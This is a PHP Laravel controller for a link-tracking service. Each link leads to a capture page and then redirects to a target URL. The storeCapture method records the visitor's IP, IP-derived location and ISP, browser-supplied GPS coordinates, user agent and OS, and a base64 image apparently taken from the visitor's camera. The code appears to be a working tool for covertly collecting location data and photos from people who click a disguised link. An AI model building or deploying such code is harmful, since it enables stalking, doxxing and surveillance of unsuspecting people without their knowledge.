<?php

namespace App\Http\Controllers;

use App\Models\TrackingLink;
use App\Models\Capture;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Str;

class TrackingLinkController extends Controller
{
    public function index(Request $request)
    {
        $query = TrackingLink::withCount('captures');

        if ($request->filled('search')) {
            $query->where('title', 'like', '%' . $request->search . '%')
                  ->orWhere('target_url', 'like', '%' . $request->search . '%');
        }

        $links = $query->orderBy('created_at', 'desc')->paginate(15);

        return response()->json($links);
    }

    public function store(Request $request)
    {
        $validated = $request->validate([
            'title' => 'required|string|max:255',
            'target_url' => 'required|url',
            'description' => 'nullable|string',
        ]);

        $link = TrackingLink::create([
            'title' => $validated['title'],
            'slug' => Str::uuid(),
            'target_url' => $validated['target_url'],
            'description' => $validated['description'],
            'is_active' => true,
        ]);

        return response()->json($link, 201);
    }

    public function show(TrackingLink $trackingLink)
    {
        return response()->json($trackingLink->load('captures'));
    }

    public function update(Request $request, TrackingLink $trackingLink)
    {
        $validated = $request->validate([
            'title' => 'sometimes|string|max:255',
            'target_url' => 'sometimes|url',
            'description' => 'nullable|string',
            'is_active' => 'sometimes|boolean',
        ]);

        $trackingLink->update($validated);

        return response()->json($trackingLink);
    }

    public function destroy(TrackingLink $trackingLink)
    {
        $trackingLink->delete();
        return response()->json(null, 204);
    }

    // Redirect page - captures visitor data
    public function redirectPage($slug)
    {
        $link = TrackingLink::where('slug', $slug)->firstOrFail();
        return response()->view('tracker.capture', ['link' => $link]);
    }

    // Store capture data
    public function storeCapture(Request $request, $slug)
    {
        $link = TrackingLink::where('slug', $slug)->firstOrFail();

        $validated = $request->validate([
            'latitude' => 'nullable|numeric',
            'longitude' => 'nullable|numeric',
            'photo' => 'nullable|string',
        ]);

        // Get IP info
        $ip = $request->ip();
        $geoData = [];
        try {
            $response = Http::get('http://ip-api.com/json/' . $ip);
            if ($response->successful()) {
                $geoData = $response->json();
            }
        } catch (\Exception $e) {
            // Silently fail
        }

        // Save photo if provided
        $photoPath = null;
        $photoUrl = null;
        if ($request->filled('photo')) {
            $photoData = $request->photo;
            if (str_starts_with($photoData, 'data:image/')) {
                $imageData = explode(',', $photoData)[1];
                $imageData = base64_decode($imageData);
                $filename = 'captures/' . $slug . '_' . time() . '_' . Str::random(8) . '.png';
                \Storage::disk('public')->put($filename, $imageData);
                $photoPath = $filename;
                $photoUrl = \Storage::url($filename);
            }
        }

        $capture = Capture::create([
            'tracking_link_id' => $link->id,
            'ip_address' => $ip,
            'country' => $geoData['country'] ?? null,
            'city' => $geoData['city'] ?? null,
            'region' => $geoData['regionName'] ?? null,
            'isp' => $geoData['isp'] ?? null,
            'latitude' => $validated['latitude'] ?? $geoData['lat'] ?? null,
            'longitude' => $validated['longitude'] ?? $geoData['lon'] ?? null,
            'browser' => $request->header('User-Agent'),
            'os' => $this->detectOS($request->header('User-Agent')),
            'user_agent' => $request->header('User-Agent'),
            'photo_path' => $photoPath,
            'photo_url' => $photoUrl,
            'captured_at' => now(),
        ]);

        $link->increment('click_count');

        return response()->json(['capture' => $capture, 'redirect_url' => $link->target_url]);
    }

    protected function detectOS($userAgent)
    {
        if (str_contains($userAgent, 'Windows')) return 'Windows';
        if (str_contains($userAgent, 'Mac OS')) return 'macOS';
        if (str_contains($userAgent, 'Linux')) return 'Linux';
        if (str_contains($userAgent, 'Android')) return 'Android';
        if (str_contains($userAgent, 'iPhone') || str_contains($userAgent, 'iPad')) return 'iOS';
        return 'Unknown';
    }
}
